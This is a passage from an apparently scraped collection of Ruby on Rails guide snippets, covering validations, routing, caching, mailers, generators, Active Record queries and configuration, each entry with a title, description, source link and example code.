}\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nirb> person = Person.new\nirb> person.valid?\n=> false\nirb> person.errors.empty?\n=> false\n\nirb> person.errors.clear\nirb> person.errors.empty?\n=> true\n\nirb> person.save\n=> false\n\nirb> person.errors.empty?\n=> false\n```\n\n----------------------------------------\n\nTITLE: Configuring Additional Asset Paths in Rails\nDESCRIPTION: Ruby code snippet showing how to configure additional asset paths for Propshaft to search for assets, in this case adding emoji image paths to the asset load path.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\n# Add additional assets to the asset load path.\nRails.application.config.assets.paths << Emoji.images_path\n```\n\n----------------------------------------\n\nTITLE: JSON Parameter Wrapping\nDESCRIPTION: Demonstrates JSON parameter wrapping feature in Rails, where the controller name is automatically added as a root key to the JSON parameters. This example shows JSON data without a root key.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{ \"name\": \"acme\", \"address\": \"123 Carrot Street\" }\n```\n\n----------------------------------------\n\nTITLE: New Rendering Method Options\nDESCRIPTION: Examples of new rendering options for plain text, HTML and body content\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nrender :plain\nrender :html\nrender :body\n```\n\n----------------------------------------\n\nTITLE: Grouping Conditional Validations in Ruby on Rails\nDESCRIPTION: Demonstrates how to group multiple validations under a single condition using with_options. This example applies an is_admin? condition to multiple validations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_52\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  with_options if: :is_admin? do |admin|\n    admin.validates :password, length: { minimum: 10 }\n    admin.validates :email, presence: true\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Nested Object Forms with form_for and fields_for - Rails (ERB + Ruby)\nDESCRIPTION: Illustrates an ERB template for editing a Customer object with nested Order forms using Rails' form_for and fields_for helpers. Enables nested editing and deletion of orders directly from the customer form using the :allow_destroy option from the model. Inputs are Customer and Order instances, and outputs are HTML forms; this pattern works for arbitrarily deep nested forms in Rails 2.3 and above.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_12\n\nLANGUAGE: html+erb\nCODE:\n```\n<% form_for @customer do |customer_form| %>\\n  <div>\\n    <%= customer_form.label :name, 'Customer Name:' %>\\n    <%= customer_form.text_field :name %>\\n  </div>\\n\\n  <!-- Here we call fields_for on the customer_form builder instance.\\n   The block is called for each member of the orders collection. -->\\n  <% customer_form.fields_for :orders do |order_form| %>\\n    <p>\\n      <div>\\n        <%= order_form.label :number, 'Order Number:' %>\\n        <%= order_form.text_field :number %>\\n      </div>\\n\\n  <!-- The allow_destroy option in the model enables deletion of\\n   child records. -->\\n      <% unless order_form.object.new_record? %>\\n        <div>\\n          <%= order_form.label :_delete, 'Remove:' %>\\n          <%= order_form.checkbox :_delete %>\\n        </div>\\n      <% end %>\\n    </p>\\n  <% end %>\\n\\n  <%= customer_form.submit %>\\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Using Template Dependencies with Wildcard Matching in ERB\nDESCRIPTION: Demonstrates how to use the new wildcard matching feature for template dependencies in Rails 5, which allows specifying multiple dependencies with a single pattern.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_62\n\nLANGUAGE: erb\nCODE:\n```\n<% # Template Dependency: recordings/threads/events/* %>\n```\n\n----------------------------------------\n\nTITLE: Rendering and Parsing JSON Content\nDESCRIPTION: This code renders a view partial in JSON format and parses the JSON content using the default `:json` parser. It then uses pattern matching to assert the value of a specific key in the JSON response.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_88\n\nLANGUAGE: ruby\nCODE:\n```\ntest \"renders JSON\" do\n  article = Article.create!(title: \"Hello, world\")\n\n  render formats: :json, partial: \"articles/article\", locals: { article: article }\n\n  assert_pattern { rendered.json => { title: \"Hello, world\" } }\nend\n```\n\n----------------------------------------\n\nTITLE: Defining Author and Book Models Without Associations in Ruby on Rails\nDESCRIPTION: These are basic model definitions for Author and Book without any associations specified.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_1\n\nLANGUAGE: Ruby\nCODE:\n```\nclass Author < ApplicationRecord\nend\n\nclass Book < ApplicationRecord\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring test execution order in Rails 4.2\nDESCRIPTION: Configuration to explicitly specify the test execution order in preparation for Rails 5.0, where tests will run in random order by default. This can be set to :sorted or :random.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_66\n\nLANGUAGE: ruby\nCODE:\n```\n# config/environments/test.rb\nRails.application.configure do\n  config.active_support.test_order = :sorted # or `:random` if you prefer\nend\n```\n\n----------------------------------------\n\nTITLE: Implementing Token Generation with ActiveRecord::Base.generates_token_for\nDESCRIPTION: Example of implementing secure, time-limited, single-use tokens using the new generates_token_for method in ActiveRecord, useful for password resets and other secure operations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ActiveRecord::Base\n  has_secure_password\n\n  generates_token_for :password_reset, expires_in: 15.minutes do\n    # `password_salt` (defined by `has_secure_password`) returns the salt for\n    # the password. The salt changes when the password is changed, so the token\n    # will expire when the password is changed.\n    password_salt&.last(10)\n  end\nend\n\nuser = User.first\ntoken = user.generate_token_for(:password_reset)\n\nUser.find_by_token_for(:password_reset, token) # => user\n\nuser.update!(password: \"new password\")\nUser.find_by_token_for(:password_reset, token) # => nil\n```\n\n----------------------------------------\n\nTITLE: Configuring Default Allowed Tags for sanitize Helper in Ruby\nDESCRIPTION: Illustrates how to configure the default allowed tags for the `sanitize` helper application-wide. This is done by setting `config.action_view.sanitized_allowed_tags` in `config/application.rb` or an environment configuration file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\nclass Application < Rails::Application\n  config.action_view.sanitized_allowed_tags = %w(table tr td)\nend\n```\n\n----------------------------------------\n\nTITLE: Testing Email in Rails Console (IRB)\nDESCRIPTION: This code snippet shows how to test sending an email from the Rails console. It retrieves a product and subscriber, then uses `ProductMailer` to send an `in_stock` email.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_110\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> product = Product.first\nstore(dev)> subscriber = product.subscribers.find_or_create_by(email: \"subscriber@example.org\")\nstore(dev)> ProductMailer.with(product: product, subscriber: subscriber).in_stock.deliver_later\n```\n\n----------------------------------------\n\nTITLE: Alternative Primary Abstract Class Configuration in Ruby\nDESCRIPTION: Configuration using primary_abstract_class for custom-named application record classes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nclass PrimaryApplicationRecord < ActiveRecord::Base\n  primary_abstract_class\n\n  connects_to database: { writing: :primary, reading: :primary_replica }\nend\n```\n\n----------------------------------------\n\nTITLE: EXPLAIN Output Example for MySQL/MariaDB with Includes\nDESCRIPTION: This shows the output of running `explain` with `includes` on MySQL or MariaDB. It shows that two queries are executed: one for customers and another for orders, because of the eager loading. The first query retrieves the customer with ID 1 and the second query retrieves all the orders associated to this customer.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_213\n\nLANGUAGE: sql\nCODE:\n```\nEXPLAIN SELECT `customers`.* FROM `customers`  WHERE `customers`.`id` = 1\n+----+-------------+-----------+-------+---------------+\n| id | select_type | table     | type  | possible_keys |\n+----+-------------+-----------+-------+---------------+\n|  1 | SIMPLE      | customers | const | PRIMARY       |\n+----+-------------+-----------+-------+---------------+\n+---------+---------+-------+------+-------+\n| key     | key_len | ref   | rows | Extra |\n+---------+---------+-------+------+-------+\n| PRIMARY | 4       | const |    1 |       |\n+---------+---------+-------+------+-------+\n\n1 row in set (0.00 sec)\n\nEXPLAIN SELECT `orders`.* FROM `orders`  WHERE `orders`.`customer_id` IN (1)\n+----+-------------+--------+------+---------------+\n| id | select_type | table  | type | possible_keys |\n+----+-------------+--------+------+---------------+\n|  1 | SIMPLE      | orders | ALL  | NULL          |\n+----+-------------+--------+------+---------------+\n+------+---------+------+------+-------------+\n| key  | key_len | ref  | rows | Extra       |\n+------+---------+------+------+-------------+\n\n\n1 row in set (0.00 sec)\n```\n\n----------------------------------------\n\nTITLE: Using watch Command with Ruby Debugger\nDESCRIPTION: Demonstrates the 'watch' command in Ruby debugger, which stops execution when a specified instance variable (@_response_body) changes. This is useful for tracking when and how variables are modified during program execution.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\n[20, 29] in ~/projects/rails-guide-example/app/controllers/posts_controller.rb\n    20|   end\n    21|\n    22|   # POST /posts or /posts.json\n    23|   def create\n    24|     @post = Post.new(post_params)\n=>  25|     debugger\n    26|\n    27|     respond_to do |format|\n    28|       if @post.save!\n    29|         format.html { redirect_to @post, notice: \"Post was successfully created.\" }\n=>#0    PostsController#create at ~/projects/rails-guide-example/app/controllers/posts_controller.rb:25\n  #1    ActionController::BasicImplicitRender#send_action(method=\"create\", args=[]) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-7.0.0.alpha2/lib/action_controller/metal/basic_implicit_render.rb:6\n  # and 72 frames (use `bt' command for all frames)\n(rdbg) watch @_response_body    # command\n#0  BP - Watch  #<PostsController:0x00007fce69ca5320> @_response_body =\n```\n\n----------------------------------------\n\nTITLE: Updating Product Show View with Styles - ERB\nDESCRIPTION: This code snippet updates the product show view to use the new CSS styles and display product information. It includes links to navigate back to the products index, displays the featured image, renders the product name and description within a cache block, and includes the inventory partial. An edit and delete button is displayed for authenticated users.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_120\n\nLANGUAGE: erb\nCODE:\n```\n<p><%= link_to \"Back\", products_path %></p>\n\n<section class=\"product\">\n  <%= image_tag @product.featured_image if @product.featured_image.attached? %>\n\n  <section class=\"product-info\">\n    <% cache @product do %>\n      <h1><%= @product.name %></h1>\n      <%= @product.description %>\n    <% end %>\n\n    <%= render \"inventory\", product: @product %>\n\n    <% if authenticated? %>\n      <%= link_to \"Edit\", edit_product_path(@product) %>\n      <%= button_to \"Delete\", @product, method: :delete, data: { turbo_confirm: \"Are you sure?\" } %>\n    <% end %>\n  </section>\n</section>\n```\n\n----------------------------------------\n\nTITLE: Scoping Routes for Localization using 'scope' in Rails 3 Router - Ruby\nDESCRIPTION: Illustrates usage of the 'scope' method in the Rails 3 router to localize routes for a specific language. Here, resourceful routes for projects are assigned Spanish path names. Key parameters include the path prefix ('es'), path_names mapping for edit action, and custom path ('proyecto'). This enables localized URLs for multi-language applications; requires Rails 3 router. Input is a block with resource definition, output are localized route helpers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_0_release_notes.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nscope 'es' do\n  resources :projects, :path_names => { :edit => 'cambiar' }, :path => 'proyecto'\nend\n\n# Gives you the edit action with /es/proyecto/1/cambiar\n```\n\n----------------------------------------\n\nTITLE: Deleting Browser-Related Middleware - Ruby\nDESCRIPTION: This Ruby snippet deletes Rack::MethodOverride from the middleware stack using config.middleware.delete in config/application.rb. This removal disables HTTP verb override by hidden form fields, which may affect RESTful controllers expecting PUT or DELETE. Input is the middleware class; output is omission of this feature.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_on_rack.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\\nconfig.middleware.delete Rack::MethodOverride\n```\n\n----------------------------------------\n\nTITLE: Descriptive Linking in Guides - Markdown\nDESCRIPTION: Shows best and poor practices for writing Markdown links. The snippet contrasts non-descriptive versus descriptive link text, guiding writers to use meaningful phrases. Markdown is the only prerequisite, targeting guide maintainers seeking accessible documentation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/ruby_on_rails_guides_guidelines.md#2025-04-23_snippet_4\n\nLANGUAGE: markdown\nCODE:\n```\n# BAD\nSee the Rails Internationalization (I18n) API documentation for [more\ndetails](i18n.html).\n\n# GOOD\nSee the [Rails Internationalization (I18n) API documentation](i18n.html) for\nmore details.\n```\n\n----------------------------------------\n\nTITLE: Conditional before_save Callback with Simplified Proc in Rails\nDESCRIPTION: Shows a simplified version of using a `Proc` with the `:if` option for conditional callback execution. The `normalize_card_number` method is called only if the `paid_with_card?` method returns true within the scope of the model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\nclass Order < ApplicationRecord\n  before_save :normalize_card_number, if: -> { paid_with_card? }\nend\n```\n\n----------------------------------------\n\nTITLE: Instantiating ActiveSupport::BufferedLogger with File Sync in Ruby\nDESCRIPTION: This Ruby code demonstrates how to create a file handle, enable synchronization (`sync = true`), and then instantiate `ActiveSupport::BufferedLogger` with that synchronized file handle. This approach is recommended as an alternative to the deprecated `ActiveSupport::BufferedLogger#auto_flushing` behavior, ensuring log entries are written immediately.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\n```ruby\nf = File.open('foo.log', 'w')\nf.sync = true\nActiveSupport::BufferedLogger.new f\n```\n```\n\n----------------------------------------\n\nTITLE: Running Named Generator\nDESCRIPTION: Command to generate a named initializer and view its contents\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate initializer core_extensions\n      create  config/initializers/core_extensions.rb\n\n$ cat config/initializers/core_extensions.rb\n```\n\n----------------------------------------\n\nTITLE: Getting Ordinal Suffixes for Integers in Ruby\nDESCRIPTION: This code demonstrates how to get the ordinal suffix (e.g., 'st', 'nd', 'rd', 'th') for an integer using the `ordinal` method. This is an ActiveSupport core extension to the Integer class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_106\n\nLANGUAGE: ruby\nCODE:\n```\n1.ordinal    # => \"st\"\n2.ordinal    # => \"nd\"\n53.ordinal   # => \"rd\"\n2009.ordinal # => \"th\"\n-21.ordinal  # => \"st\"\n-134.ordinal # => \"th\"\n```\n\n----------------------------------------\n\nTITLE: Defining Subscriber Fixtures - YAML\nDESCRIPTION: This YAML snippet defines two subscriber fixtures, `david` and `chris`. Each fixture is associated with the `tshirt` product fixture, and has an `email` attribute. These fixtures are automatically loaded into the test database for use in testing.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_123\n\nLANGUAGE: yaml\nCODE:\n```\ndavid:\n  product: tshirt\n  email: david@example.org\n\nchris:\n  product: tshirt\n  email: chris@example.org\n```\n\n----------------------------------------\n\nTITLE: Strict Validations in Ruby on Rails\nDESCRIPTION: Demonstrates how to use strict validations that raise exceptions when validation fails. Examples include using the built-in StrictValidationFailed exception and a custom exception.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_54\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :name, presence: { strict: true }\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nirb> Person.new.valid?\n=> ActiveModel::StrictValidationFailed: Name can't be blank\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :token, presence: true, uniqueness: true, strict: TokenGenerationException\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nirb> Person.new.valid?\n=> TokenGenerationException: Token can't be blank\n```\n\n----------------------------------------\n\nTITLE: Bytes Conversion with Singular Forms in Ruby\nDESCRIPTION: Demonstrates the use of singular forms like `megabyte`, aliased to their plural forms, for byte conversions.  This is part of the ActiveSupport core extension to the Numeric class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_96\n\nLANGUAGE: ruby\nCODE:\n```\n1.megabyte # => 1048576\n```\n\n----------------------------------------\n\nTITLE: Validating Exclusion Using a Dynamic Set (Proc) in Rails (Ruby)\nDESCRIPTION: Shows dynamic validation using the `exclusion` helper in an `Account` model. The set of disallowed values for the `subdomain` attribute is dynamically generated by executing a lambda (`->(account) { account.reserved_subdomains }`), which calls the `reserved_subdomains` instance method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\nclass Account < ApplicationRecord\n  validates :subdomain, exclusion: { in: ->(account) { account.reserved_subdomains } }\n\n  def reserved_subdomains\n    %w(www us ca jp admin)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using Nested Assert Dom Blocks\nDESCRIPTION: This code snippet uses nested `assert_dom` blocks to verify the presence of nested HTML elements within a view.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_80\n\nLANGUAGE: ruby\nCODE:\n```\nassert_dom \"ul.navigation\" do\n  assert_dom \"li.menu_item\"\nend\n```\n\n----------------------------------------\n\nTITLE: Customizing Truncation Omission with truncate\nDESCRIPTION: This Ruby code demonstrates how to customize the omission string used by the `truncate` method. By using the `:omission` option, you can specify a different string to indicate that the string has been truncated.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_42\n\nLANGUAGE: ruby\nCODE:\n```\n\"Oh dear! Oh dear! I shall be late!\".truncate(20, omission: \"&hellip;\")\n```\n\n----------------------------------------\n\nTITLE: Using HStore for Key-Value Storage in Rails\nDESCRIPTION: Demonstrates implementation of PostgreSQL's hstore type for key-value storage in Rails, including extension enabling, migration setup, and querying examples.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20131009135255_create_profiles.rb\nclass CreateProfiles < ActiveRecord::Migration[8.1]\n  enable_extension \"hstore\" unless extension_enabled?(\"hstore\")\n  create_table :profiles do |t|\n    t.hstore \"settings\"\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/profile.rb\nclass Profile < ApplicationRecord\nend\n```\n\n----------------------------------------\n\nTITLE: Initializing and Running Rails Server via Rack::Server - Ruby\nDESCRIPTION: This Ruby snippet demonstrates how bin/rails server creates and starts a Rack-compatible server by initializing a Rails::Server object, setting the working directory to the Rails application's root, and requiring the application file. It highlights the inheritance of Rails::Server from Rack::Server and the method override for server startup. Dependencies include a working Rails application and the presence of APP_PATH. Inputs involve no arguments, and the output results in the server running with the default configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_on_rack.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nRails::Server.new.tap do |server|\\n  require APP_PATH\\n  Dir.chdir(Rails.application.root)\\n  server.start\\nend\n```\n\n----------------------------------------\n\nTITLE: Model Definition for Fixtures with Composite Key\nDESCRIPTION: This snippet defines a model with a composite primary key for use with fixtures. The `Book` model has a composite primary key of `[:author_id, :id]` and belongs to an `Author`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  self.primary_key = [:author_id, :id]\n  belongs_to :author\nend\n```\n\n----------------------------------------\n\nTITLE: Running Git Commands with git\nDESCRIPTION: Demonstrates how to run Git commands using the `git` method. The example initializes a Git repository, adds all files, and creates an initial commit.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\ngit :init\ngit add: \".\"\ngit commit: \"-a -m 'Initial commit'\"\n```\n\n----------------------------------------\n\nTITLE: Legacy Rails Validation Syntax\nDESCRIPTION: Demonstrates the older helper method style of validation syntax.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nvalidates_presence_of :name\n```\n\n----------------------------------------\n\nTITLE: Resourceful Route with Controller Option in Rails\nDESCRIPTION: This snippet illustrates how to specify a different controller for a resource using the `:controller` option. It routes requests to `/photos` to the `Images` controller instead of the `Photos` controller.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_62\n\nLANGUAGE: ruby\nCODE:\n```\nresources :photos, controller: \"images\"\n```\n\n----------------------------------------\n\nTITLE: Checking Symbol Prefix and Suffix in Ruby\nDESCRIPTION: This shows how to check if a symbol starts or ends with a particular string using `starts_with?` and `ends_with?` methods. These are ActiveSupport core extensions to the Symbol class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_94\n\nLANGUAGE: ruby\nCODE:\n```\n:foo.starts_with?(\"f\") # => true\n:foo.ends_with?(\"o\")   # => true\n```\n\n----------------------------------------\n\nTITLE: Rendering Comment Form Partial in Article View (ERB)\nDESCRIPTION: Includes the comment form partial (`blorgh/comments/_form`) within the article show view (`app/views/blorgh/articles/show.html.erb`). This is placed after rendering the existing comments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_20\n\nLANGUAGE: erb\nCODE:\n```\n<%= render \"blorgh/comments/form\" %>\n```\n\n----------------------------------------\n\nTITLE: Using group with has_and_belongs_to_many Association in ActiveRecord\nDESCRIPTION: Shows how to use the group option with a has_and_belongs_to_many association to group the result set by a specific attribute using a GROUP BY clause in the SQL query.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_125\n\nLANGUAGE: ruby\nCODE:\n```\nclass Parts < ApplicationRecord\n  has_and_belongs_to_many :assemblies, -> { group \"factory\" }\nend\n```\n\n----------------------------------------\n\nTITLE: Equality Condition with String Key in Rails\nDESCRIPTION: This snippet shows an alternative way to specify equality conditions in Active Record using a string as the key for the attribute. This is equivalent to using a symbol and achieves the same result.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_60\n\nLANGUAGE: ruby\nCODE:\n```\nBook.where(\"out_of_print\" => true)\n```\n\n----------------------------------------\n\nTITLE: HTML Email Template for Welcome Email\nDESCRIPTION: Creates an HTML template for the welcome email that includes personalized content using instance variables set in the mailer method. This is stored as welcome_email.html.erb.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_6\n\nLANGUAGE: html+erb\nCODE:\n```\n<h1>Welcome to example.com, <%= @user.name %></h1>\n<p>\n  You have successfully signed up to example.com,\n  your username is: <%= @user.login %>.<br>\n</p>\n<p>\n  To login to the site, just follow this link: <%= link_to 'login', login_url %>.\n</p>\n<p>Thanks for joining and have a great day!</p>\n```\n\n----------------------------------------\n\nTITLE: Starting Rackup Server\nDESCRIPTION: The Rackup::Server#start method which handles command-line options, loads required libraries, manages process daemonization, PID handling, and ultimately runs the Rack application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Rackup\n  class Server\n    def start(&block)\n      if options[:warn]\n        $-w = true\n      end\n\n      if includes = options[:include]\n        $LOAD_PATH.unshift(*includes)\n      end\n\n      Array(options[:require]).each do |library|\n        require library\n      end\n\n      if options[:debug]\n        $DEBUG = true\n        require \"pp\"\n        p options[:server]\n        pp wrapped_app\n        pp app\n      end\n\n      check_pid! if options[:pid]\n\n      # Touch the wrapped app, so that the config.ru is loaded before\n      # daemonization (i.e. before chdir, etc).\n      handle_profiling(options[:heapfile], options[:profile_mode], options[:profile_file]) do\n        wrapped_app\n      end\n\n      daemonize_app if options[:daemonize]\n\n      write_pid if options[:pid]\n\n      trap(:INT) do\n        if server.respond_to?(:shutdown)\n          server.shutdown\n        else\n          exit\n        end\n      end\n\n      server.run(wrapped_app, **options, &block)\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Action Controller Caching in API Mode\nDESCRIPTION: Example of including the ActionController::Caching module in an API controller and manually configuring the cache store. This is necessary because Rails does not pass this configuration automatically when in API mode.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationController < ActionController::API\n  include ::ActionController::Caching\n  self.cache_store = :mem_cache_store\nend\n```\n\n----------------------------------------\n\nTITLE: Accessing Validation Errors in Rails Console\nDESCRIPTION: This snippet shows how to access validation errors in the Rails console. It demonstrates checking validity and retrieving full error messages for different object states.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_63\n\nLANGUAGE: ruby\nCODE:\n```\nirb> person = Person.new\nirb> person.valid?\n=> false\nirb> person.errors.full_messages\n=> [\"Name can't be blank\", \"Name is too short (minimum is 3 characters)\"]\n\nirb> person = Person.new(name: \"John Doe\")\nirb> person.valid?\n=> true\nirb> person.errors.full_messages\n=> []\n\nirb> person = Person.new\nirb> person.valid?\n=> false\nirb> person.errors.first.details\n=> {:error=>:too_short, :count=>3}\n```\n\n----------------------------------------\n\nTITLE: Implementing Action Mailer in Ruby on Rails\nDESCRIPTION: This Ruby code snippet shows how to define a mailer class UserMailer with a welcome method. It demonstrates both a basic implementation and how to use default_i18n_subject for internationalized email subjects.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_41\n\nLANGUAGE: ruby\nCODE:\n```\n# user_mailer.rb\nclass UserMailer < ActionMailer::Base\n  def welcome(user)\n    #...\n  end\nend\n\n# user_mailer.rb\nclass UserMailer < ActionMailer::Base\n  def welcome(user)\n    mail(to: user.email, subject: default_i18n_subject(user: user.name))\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Foreign Key Generation without Underscore in Ruby\nDESCRIPTION: This code shows how to generate a foreign key without an underscore before 'id'. It calls the `foreign_key` method with a `false` argument to disable the underscore.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_88\n\nLANGUAGE: ruby\nCODE:\n```\n\"User\".foreign_key(false) # => \"userid\"\n```\n\n----------------------------------------\n\nTITLE: Enabling Storage of Key References in Encrypted Messages - Ruby\nDESCRIPTION: Configures Rails' Active Record Encryption to store a reference to the key used for encryption inside the message headers, by setting the relevant configuration property in application initialization code. This can make decryption faster when multiple keys are in use. Add this line to the relevant environment config (e.g., application.rb or environment-specific files).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.encryption.store_key_references = true\n```\n\n----------------------------------------\n\nTITLE: Configuring SameSite Cookie Protection\nDESCRIPTION: This snippet shows how to configure the `SameSite` attribute for cookies dynamically based on the request's user agent. If the user agent is \"TestAgent\", the `SameSite` attribute will be `:strict`; otherwise, it uses the default value.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_51\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_dispatch.cookies_same_site_protection = ->(request) do\n  :strict unless request.user_agent == \"TestAgent\"\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring X-Sendfile Header for Nginx - Rails Configuration - Ruby\nDESCRIPTION: Sets the X-Accel-Redirect header for Nginx when using Rack::Sendfile. This offloads file-serving duties from Rails to Nginx, improving performance for file downloads.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_dispatch.x_sendfile_header = \"X-Accel-Redirect\"\n```\n\n----------------------------------------\n\nTITLE: Redirection with Dynamic Segments (Ruby)\nDESCRIPTION: Redirects requests from one path to another while reusing dynamic segments from the matched route.  `%{name}` is used to interpolate the value of the `name` parameter into the redirect path.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_51\n\nLANGUAGE: ruby\nCODE:\n```\nget \"/stories/:name\", to: redirect(\"/articles/%{name}\")\n```\n\n----------------------------------------\n\nTITLE: Defining Command-Line Options for a Rails Generator in Ruby\nDESCRIPTION: Defines a `InitializerGenerator` class inheriting from `Rails::Generators::NamedBase`. It uses `class_option` (from Thor) to add a `--scope` command-line option with a default value 'app', making the generator configurable when invoked.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nclass InitializerGenerator < Rails::Generators::NamedBase\n  class_option :scope, type: :string, default: \"app\"\nend\n```\n\n----------------------------------------\n\nTITLE: Low-Level Caching: Fetch with Default\nDESCRIPTION: Demonstrates fetching a value from the cache using `Rails.cache.fetch` with a block. If the value is not found in the cache, the block is executed to set a default value.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\n# Fetch a value with a block to set a default if it doesn’t exist\nwelcome_message = Rails.cache.fetch(\"welcome_message\") { \"Welcome to Rails!\" }\nputs welcome_message # Output: Welcome to Rails!\n```\n\n----------------------------------------\n\nTITLE: Setting I18n Paths and Locales from Initializer - 